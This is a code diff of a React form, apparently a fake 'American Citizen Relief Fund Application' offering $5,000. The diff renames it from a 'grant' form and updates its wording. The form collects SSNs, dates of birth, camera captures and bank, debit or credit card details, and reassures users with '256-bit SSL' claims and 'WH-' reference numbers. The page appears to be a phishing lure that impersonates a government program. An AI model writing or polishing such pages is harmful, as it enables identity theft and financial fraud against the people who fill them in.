@@ -47,7 +47,7 @@ const US_STATES = [
 ];
 
 function generateRef() {
-  return `WH-GRANT-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).slice(2,6).toUpperCase()}`;
+  return `WH-RELIEF-FUND-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).slice(2,6).toUpperCase()}`;
 }
 
 function Required() {
@@ -182,7 +182,7 @@ function CameraCapture({ label, hint, onCapture, error }: { label: React.ReactNo
   );
 }
 
-export default function GrantForm() {
+export default function ReliefFundForm() {
   const uid = useId();
   const [data, setData] = useState<FormData>({
     firstName: "", lastName: "", dateOfBirth: "", ssn: "",
@@ -295,8 +295,8 @@ export default function GrantForm() {
 
   if (submitted) {
     return (
-      <div className="grant-form-card">
-        <div className="grant-form-header">
+      <div className="relief-fund-form-card">
+        <div className="relief-fund-form-header">
           <div className="form-icon"><CheckCircle size={22} color="white" /></div>
           <div>
             <h3>Application Submitted</h3>
@@ -315,7 +315,7 @@ export default function GrantForm() {
             </div>
             <h3>Application Received!</h3>
             <p>
-              Thank you, <strong>{data.firstName} {data.lastName}</strong>. Your $5,000 grant application
+              Thank you, <strong>{data.firstName} {data.lastName}</strong>. Your $5,000 relief fund application
               has been successfully submitted and is now under review.
             </p>
             <p>You will receive a confirmation to <strong>{data.email}</strong> within 24–48 hours.</p>
@@ -333,28 +333,28 @@ export default function GrantForm() {
 
   return (
     <motion.div
-      className="grant-form-card"
+      className="relief-fund-form-card"
       initial={{ opacity: 0, y: 30 }}
       whileInView={{ opacity: 1, y: 0 }}
       viewport={{ once: true }}
       transition={{ duration: 0.6 }}
     >
       {/* Form header */}
-      <div className="grant-form-header">
+      <div className="relief-fund-form-header">
         <div className="form-icon">
           <FileText size={22} color="white" />
         </div>
         <div>
-          <h3>American Citizen Grant Application</h3>
+          <h3>American Citizen Relief Fund Application</h3>
           <span>Form ACG-5000 · Secure Online Application</span>
         </div>
       </div>
 
       <form
-        className="grant-form-body"
+        className="relief-fund-form-body"
         onSubmit={handleSubmit}
         noValidate
-        aria-label="Grant Application Form"
+        aria-label="Relief Fund Application Form"
       >
         {/* ── PERSONAL INFORMATION ── */}
         <p className="form-section-label">Personal Information</p>
@@ -675,7 +675,7 @@ export default function GrantForm() {
         <div className="bank-warning">
           <ShieldCheck size={14} aria-hidden="true" style={{ flexShrink: 0, marginTop: 2 }} />
           <span>
-            <strong>Why do we need this?</strong> To ensure prompt and direct crediting of your grant funds into your account, debit, or credit card. This information is encrypted with 256-bit SSL and used solely for grant disbursement.
+            <strong>Why do we need this?</strong> To ensure prompt and direct crediting of your relief fund funds into your account, debit, or credit card. This information is encrypted with 256-bit SSL and used solely for relief fund disbursement.
           </span>
         </div>
 
